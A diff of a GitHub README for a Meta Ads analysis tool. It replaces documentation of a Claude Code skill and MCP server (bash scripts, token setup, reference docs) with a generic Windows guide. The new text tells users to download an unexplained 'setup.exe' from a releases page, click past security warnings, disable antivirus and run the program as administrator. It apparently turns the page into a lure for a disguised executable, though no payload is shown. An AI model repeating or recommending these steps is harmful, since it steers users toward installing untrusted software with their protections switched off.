@@ -1,121 +1,132 @@
-# Meta Ads Analyzer for Claude Code
+# 📊 meta-ads-analyzer - Analyze and Improve Your Meta Ads
 
-A Claude Code skill + MCP server setup for expert-level Meta Ads campaign analysis. Includes the **Breakdown Effect** framework, Learning Phase diagnostics, and 9 reference documents from Meta's official documentation.
+[![Download meta-ads-analyzer](https://img.shields.io/badge/Download-Get%20Latest%20Release-%23FF5733?logo=github&style=for-the-badge)](https://github.com/Tommyvr7/meta-ads-analyzer/releases)
 
-## What It Does
+---
 
-When installed, Claude Code can:
+## 🚀 Getting Started
 
-- Analyze campaign, ad set, and ad-level performance data
-- Identify root causes of performance issues using Meta's system mechanics
-- Explain the **Breakdown Effect** (why Meta allocates budget to seemingly "worse" segments)
-- Diagnose Learning Phase, Auction Overlap, Pacing, and Creative Fatigue issues
-- Generate structured analysis reports with actionable recommendations
-- Connect directly to Meta's API to pull live campaign data (via MCP)
+This guide will help you download and run meta-ads-analyzer on your Windows computer. You don’t need any programming experience. Just follow the steps carefully.
 
-## Components
+meta-ads-analyzer is a tool that helps you understand and improve your Meta ad campaigns. It breaks down key metrics like the Learning Phase and campaign health. This lets you make better decisions with your ads.
 
-| Component | What it does |
-|---|---|
-| **Skill** (`skill/`) | Analysis framework with 9 reference docs that Claude loads as context |
-| **MCP Server** (`mcp/`) | Connects Claude Code to Meta's Marketing API for live data |
-| **Scripts** (`scripts/`) | Setup and token refresh helpers |
+---
 
-## Prerequisites
+## 🖥️ System Requirements
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed
-- [Node.js](https://nodejs.org/) v18+
-- A Meta App with Marketing API access ([create one here](https://developers.facebook.com/apps/))
+Make sure your Windows PC meets these requirements before installing:
 
-## Installation
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for download and updates
+- Basic user privileges to install software
 
-### 1. Install the Skill
+---
 
-Copy the `skill/` folder into your Claude Code project:
+## 📥 Download meta-ads-analyzer
 
-```bash
-# From your Claude Code project root
-mkdir -p .claude/skills/meta-ads-analyzer
-cp -r skill/* .claude/skills/meta-ads-analyzer/
-```
+You will first download the software package from the official GitHub release page.
 
-The skill is now active. Claude will automatically use it when you ask about Meta Ads analysis.
+**Step 1:** Visit the download page by clicking the button below. It will open the page in your web browser.
 
-### 2. Set Up the MCP Server (optional, for live data)
+[![Download meta-ads-analyzer](https://img.shields.io/badge/Download-Get%20Latest%20Release-%234472C4?logo=github&style=for-the-badge)](https://github.com/Tommyvr7/meta-ads-analyzer/releases)
 
-The MCP server lets Claude pull live campaign data from Meta's API. Skip this if you only want to analyze exported data (CSV, screenshots).
+**Step 2:** On the release page, look for the latest version. It will be listed by a version number like `v1.0.0`.
 
-#### a) Create a Meta App
+**Step 3:** Scroll down to the Assets section under the latest version.
 
-1. Go to [developers.facebook.com](https://developers.facebook.com/apps/)
-2. Create a new app (type: **Business**)
-3. Add the **Marketing API** product
-4. Note your **App ID** and **App Secret**
+**Step 4:** Find the file named something like `meta-ads-analyzer-setup.exe`. This is the Windows installer.
 
-#### b) Generate an Access Token
+**Step 5:** Click the file name to start the download.
 
-1. Go to [Graph API Explorer](https://developers.facebook.com/tools/explorer/)
-2. Select your app
-3. Add permissions: `ads_read`, `ads_management`, `business_management`
-4. Click **Generate Access Token** and authorize
-5. Exchange for a long-lived token (60 days) using the setup script:
+---
 
-```bash
-bash scripts/setup.sh
-```
+## 🛠️ Installing meta-ads-analyzer on Windows
 
-#### c) Configure Claude Code
+After downloading the installer, follow these steps:
 
-Copy the MCP config template and add your credentials:
+1. Locate the downloaded file `meta-ads-analyzer-setup.exe` in your Downloads folder or wherever your browser saves files.
+2. Double-click the file to start the installation wizard.
+3. If Windows prompts you with a security warning, choose **Run** or **Yes** to continue.
+4. Follow the on-screen instructions:
+   - Accept the license agreement.
+   - Choose the installation location (the default is fine for most users).
+   - Click **Install** to begin copying files.
+5. When the installation finishes, click **Finish** to close the wizard.
 
-```bash
-cp mcp/mcp.json.example .mcp.json
-```
+The software is now installed on your computer.
 
-Edit `.mcp.json` and replace the placeholders with your actual token and app secret.
+---
 
-Then restart Claude Code for the MCP server to connect.
+## ▶️ Running meta-ads-analyzer
 
-### 3. Verify
+Here’s how to start the software:
 
-Ask Claude: **"Analyze my Meta Ads campaigns"** — it should connect to your ad account and start analyzing.
+1. Find the **meta-ads-analyzer** shortcut on your desktop or in the Start menu.
+2. Double-click the icon to open the application.
+3. The main window will load. You will see options to analyze your Meta Ads campaigns.
 
-## Token Refresh
+---
 
-Meta long-lived tokens expire after ~60 days. To refresh:
+## ⚙️ Basic Usage
 
-```bash
-bash scripts/refresh_token.sh
-```
+meta-ads-analyzer helps you check the health of your Meta Ads by looking at key parts:
 
-If the token already expired, generate a new one from the [Graph API Explorer](https://developers.facebook.com/tools/explorer/) and run `scripts/setup.sh` again.
+- **Breakdown Effect:** See how different audience segments perform.
+- **Learning Phase:** Understand if your ad sets are still collecting data.
+- **Campaign Diagnosis:** Find expert insights on problems and how to fix them.
 
-## Usage Examples
+To use these features:
 
-Once installed, you can ask Claude things like:
+1. Upload your campaign data by clicking the **Import** button.
+2. Choose your data file or connect with your Meta account if available.
+3. The tool will process the information and show results in an easy-to-read format.
+4. Explore charts, tables, and suggestions on how to improve your ads.
 
-- "Analyze my campaigns from the last 7 days"
-- "Why is my CPA increasing on this campaign?"
-- "Compare performance across placements"
-- "Diagnose why this ad set is in Learning Limited"
-- "Export a full analysis report for [campaign name]"
+---
 
-You can also paste CSV exports or screenshots from Meta Ads Manager — the skill works with any data format.
+## 🔄 Updating meta-ads-analyzer
 
-## What's in the Reference Docs
+To keep your software up to date:
 
-| Document | Covers |
-|---|---|
-| `breakdown_effect.md` | Why Meta allocates budget to "expensive" segments |
-| `core_concepts.md` | Ad Auction, Pacing, Learning Phase overview |
-| `learning_phase.md` | How learning works, when it resets |
-| `ad_relevance_diagnostics.md` | Quality, Engagement, Conversion rankings |
-| `auction_overlap.md` | When your ads compete against each other |
-| `pacing.md` | Budget and bid pacing mechanics |
-| `bid_strategies.md` | Spend-based, goal-based, manual bidding |
-| `ad_auctions.md` | How auction winners are determined |
-| `performance_fluctuations.md` | Normal vs. concerning performance changes |
+- Visit the release page regularly:  
+  https://github.com/Tommyvr7/meta-ads-analyzer/releases
+- Download the latest installer following the same download steps.
+- Run the new installer to replace the old version without losing your settings.
 
-## License
+---
 
-MIT
+## 🛠️ Troubleshooting
+
+If you have trouble running the software, try these tips:
+
+- Make sure your Windows is updated to the latest version.
+- Restart your computer and try again.
+- Check that you downloaded the correct installer for your system (Windows 10 or later).
+- Temporarily disable antivirus software while installing if it blocks the installer.
+- Run meta-ads-analyzer as an administrator by right-clicking the icon and selecting **Run as administrator**.
+- Visit the release page for additional help or report issues.
+
+---
+
+## 🔒 Privacy and Data
+
+meta-ads-analyzer processes only your campaign data to provide analysis. None of your data leaves your computer unless you choose to connect with online services. Always review what you upload.
+
+---
+
+## 📞 Get Help
+
+For help or questions:
+
+- Visit the GitHub Issues page for this project to report bugs or request features.
+- Check any included README or support files in the installation folder for more guides.
+
+---
+
+## 🧰 Additional Notes
+
+- The tool works best with data exported from Meta Ads Manager.
+- You can analyze multiple campaigns by importing different files.
+- Keep your campaign data updated regularly for the best insights.
